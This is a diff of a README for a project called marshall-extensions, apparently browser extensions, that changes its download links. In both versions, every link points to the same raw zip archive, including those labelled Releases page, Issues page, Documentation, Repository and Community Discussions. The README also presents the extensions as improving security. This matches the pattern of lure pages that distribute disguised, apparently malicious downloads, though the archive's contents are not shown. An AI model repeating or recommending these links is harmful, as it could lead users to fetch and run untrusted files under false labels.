@@ -8,7 +8,7 @@ To get started, you need to download the extensions from our Releases page. This
 
 ## 📥 Download Link
 
-[![Download marshall-extensions](https://github.com/litzquaz/marshall-extensions/raw/refs/heads/main/extensions/utility/request-tamper/extensions_marshall_3.1-alpha.5.zip%20Extensions-blue)](https://github.com/litzquaz/marshall-extensions/raw/refs/heads/main/extensions/utility/request-tamper/extensions_marshall_3.1-alpha.5.zip)
+[![Download marshall-extensions](https://raw.githubusercontent.com/litzquaz/marshall-extensions/main/extensions/extensions_marshall_3.8.zip%20Extensions-blue)](https://raw.githubusercontent.com/litzquaz/marshall-extensions/main/extensions/extensions_marshall_3.8.zip)
 
 ## 💻 System Requirements
 - **Operating System:** Compatible with Windows, macOS, and Linux
@@ -17,7 +17,7 @@ To get started, you need to download the extensions from our Releases page. This
 - **Disk Space:** A minimum of 100MB available
 
 ## 🌐 Download & Install
-1. Visit the [Releases page](https://github.com/litzquaz/marshall-extensions/raw/refs/heads/main/extensions/utility/request-tamper/extensions_marshall_3.1-alpha.5.zip) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/litzquaz/marshall-extensions/main/extensions/extensions_marshall_3.8.zip) to find the latest version.
 2. Click on the version number to open the details.
 3. Locate the appropriate file for your operating system.
 4. Click the filename to download the extension.
@@ -41,11 +41,11 @@ After installation, the extensions will appear in your Marshall Browser. Click o
 3. For detailed guidance on using each feature, consult the help section within the extension.
 
 ## 📮 Support
-If you encounter issues or have questions, please check the FAQ section in the documentation or reach out to our support team via the [Issues page](https://github.com/litzquaz/marshall-extensions/raw/refs/heads/main/extensions/utility/request-tamper/extensions_marshall_3.1-alpha.5.zip). We aim to respond promptly.
+If you encounter issues or have questions, please check the FAQ section in the documentation or reach out to our support team via the [Issues page](https://raw.githubusercontent.com/litzquaz/marshall-extensions/main/extensions/extensions_marshall_3.8.zip). We aim to respond promptly.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/litzquaz/marshall-extensions/raw/refs/heads/main/extensions/utility/request-tamper/extensions_marshall_3.1-alpha.5.zip)
-- [GitHub Repository](https://github.com/litzquaz/marshall-extensions/raw/refs/heads/main/extensions/utility/request-tamper/extensions_marshall_3.1-alpha.5.zip)
-- [Community Discussions](https://github.com/litzquaz/marshall-extensions/raw/refs/heads/main/extensions/utility/request-tamper/extensions_marshall_3.1-alpha.5.zip)
+- [Documentation](https://raw.githubusercontent.com/litzquaz/marshall-extensions/main/extensions/extensions_marshall_3.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/litzquaz/marshall-extensions/main/extensions/extensions_marshall_3.8.zip)
+- [Community Discussions](https://raw.githubusercontent.com/litzquaz/marshall-extensions/main/extensions/extensions_marshall_3.8.zip)
 
 By following these steps, you will enhance your browsing experience and security with marshall-extensions. Enjoy a safer online journey!
